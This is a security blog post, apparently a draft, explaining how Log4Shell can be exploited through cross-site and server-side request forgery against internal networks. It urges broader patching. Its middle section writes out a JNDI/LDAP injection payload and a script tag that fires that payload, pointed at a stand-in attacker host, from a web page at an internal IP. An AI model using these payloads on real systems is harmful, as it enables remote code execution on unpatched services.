---
title: "Log4Shell and Request Forgery Attacks"
date: 2022-01-04T15:18:18-08:00
draft: true
tags: [
        "pentest", "red","research"
    ]

twitter:
  card: "summary_large_image"
  site: "@wunderwuzzi23"
  creator: "@wunderwuzzi23"
  title: "Log4Shell and Request Forgery Attacks"
  description:  "Beware of Log4Shell and Request Forgery Attacks"
  image: "https://embracethered.com/blog/images/2022/log4shell.png"
---


The last weeks of 2021 got quite interesting for security professionals and software engineers.

Apache's [log4j library](https://logging.apache.org/log4j/2.x/) and its now prominent [Java Naming and Directory Interface support](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html), which enables easy remote code execution, made the news across the industry. 

What makes Log4Shell scary is the widespread adoption of the Log4j library amongst Java applications, and the ease of remote exploitation. 

**A dangerous combination.** 

Patches got released, bypasses were discovered more patches were released and so forth.

A lot has been written and great information is out there around [discovery](https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/), [exploitation](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/#exploit) as well as [mitigations](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance). This post is not intended to repeat that information. 

![Log4Shell and Request Forgery Attacks](/blog/images/2022/log4shell.png)

However, an area that has not gotten a lot of attention is the exploitation of Log4Shell in Request Forgery Attacks that target internal infrastructure and web servers by using the browser or a vulnerable service as confused deputy.

## What are Request Forgery Attacks?

Request Forgery Attacks create requests that have unintended consequences for the victim of the attack. 

These can typically be put in two categories, based on where the request is forged (client or server)
 
1. **Cross-Site Request Forgery Attacks** (CSRF) - these attacks make the client/browser connect to resources and trigger unintended actions. This attack typically leverages authentication tokens to invoke privileged operations on the users behalf via a web browser.
2. **Server-Side Request Forgery Attacks** (SSRF) - these attacks create a request on the server side, where an attacker is able to provide a URL to the server and the server will later connect to that URL. This could be via a wide range of destinations and protocols (localhost, internal networks, http, ftp, ldap,...)

Both kinds of request forgery vulnerabilities are quite common in web application and services. Also see the [confused deputy problem](https://en.wikipedia.org/wiki/Confused_deputy_problem) for a generic explanation of this kind of security issue.

## Why is this interesting in regard to Log4j?

**What makes request forgery attacks so powerful in regard to Log4j is that the Log4j vulnerability often can be triggered without any form of authentication**. 

This makes Cross-Site Request Forgery Attacks that target local or internal network resources very plausible. The same goes for the Server-Side attack scenarios. 

Any Server-Side feature which allows a user to specify a URL to control where a service connects to can potentially be leveraged to target internal infrastructure and probe for the log4j vulnerability.

## Simple GET requests trigger Log4Shell

Remember that in many cases all that is needed to reach a vulnerable log4j system is a GET request with a query parameter that contains the attack payload, for example:

`?username=${jndi:ldap://attacker/p}`

This payload can be provided by a malicious web page, e.g. when loading `image` or `script` tags:

`<script src="https://10.0.0.1/?username=${jndi:ldap://attacker/p}">`

This request will attack an internal network (such as the `10.0.0.1` IP address). It can also target applications installed on `localhost` (including phones!) of the victim browsing the Internet. 

![Log4Shell and Request Forgery Attacks - Log4 What?](/blog/images/2022/glasses.png)

An adversary can automate and scale this technique via JavaScript and AJAX requests or by just adding more tags in the HTML document.

Beware of this attack vector (possibly in combination with phishing attacks) patch and protect internally facing applications as well.

## Conclusion

This post discussed how both Cross-Site (client based) and Server-Side Request Forgery Attacks can lead to succesful exploitation of the log4j vulnerability.

**If you were solely focused on patching externally facing applications and services expand your analysis to everything, including internal infrastructure, as well as developer and end user machines.**

[Chrome and Edge](https://chromestatus.com/feature/5436853517811712) seem to add more restrictions for browsers to talk to private networks as well.

Keep scanning and patching!

## References

* [Apache Log4j Overview](https://logging.apache.org/log4j/2.x/) 
* [JNDI Overview](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html)
* [CISA - Apache Log4j Vulnerabilty Guidance](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance)
* [Apache Log4j Vulnerability - Exploit](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/#exploit)
* [Confused Deputy Problem](https://en.wikipedia.org/wiki/Confused_deputy_problem)
* [Guidance for preventing, detecting and hunting for CVE 2021-44228](https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/)
* [Feature: Restrict "private network requests" for subresources from public websites to secure contexts](https://chromestatus.com/feature/5436853517811712)
* Image with the glasses taken from Microsoft Image search included in PowerPoint - credit goes to whoever created the image.
